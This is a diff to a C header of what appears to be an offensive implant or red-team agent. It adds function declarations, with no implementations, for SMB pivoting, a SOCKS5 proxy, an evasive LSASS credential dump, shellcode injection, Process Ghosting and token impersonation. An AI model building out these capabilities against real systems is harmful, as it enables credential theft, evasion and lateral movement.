@@ -47,6 +47,29 @@ char *cmd_rdi_inject(DWORD pid, const char *dll_b64);
 char *cmd_dll_inject(const char *dll_b64);
 char *cmd_execute_assembly(const char *asm_b64, const char *arguments);
 
+/* ── SMB pivot helpers ─────────────────────────────────────────────────────── */
+char *cmd_pivot_listen(const char *pipe_suffix_utf8);
+char *cmd_pivot_connect(const char *full_pipe_utf8);
+char *cmd_pivot_send(uint32_t agent_id, const char *data_b64);
+
+/* ── SOCKS5 proxy ──────────────────────────────────────────────────────────── */
+char *cmd_socks_start(int port);
+char *cmd_socks_stop(void);
+char *cmd_socks_poll(void);
+
+/* ── LSASS dump (nanodump adapter, syscall-based, no MiniDumpWriteDump) ────── */
+char *cmd_lsass_dump(const char *out_path);
+
+/* ── KaynLdr shellcode injection (Cracked5pider, MIT) ───────────────────── */
+char *cmd_shellcode_inject(DWORD pid, const char *sc_b64);
+
+/* ── Process Ghosting PE execution (hasherezade technique) ──────────────── */
+char *cmd_ghost_inject(const char *pe_b64, const char *cmdline, DWORD parent_pid);
+
+/* ── Token impersonation (Havoc/Sliver-derived) ────────────────────────────── */
+/* Source: HavocFramework/Havoc Token.c (MIT) + BishopFox/sliver priv_windows.go (MIT) */
+#include "../../fitnah/implant/token/token.h"
+
 /* ── syscall/direct_syscall.c ──────────────────────────────────────────────── */
 #include <winternl.h>
 BOOL      Syscall_Initialize(void);
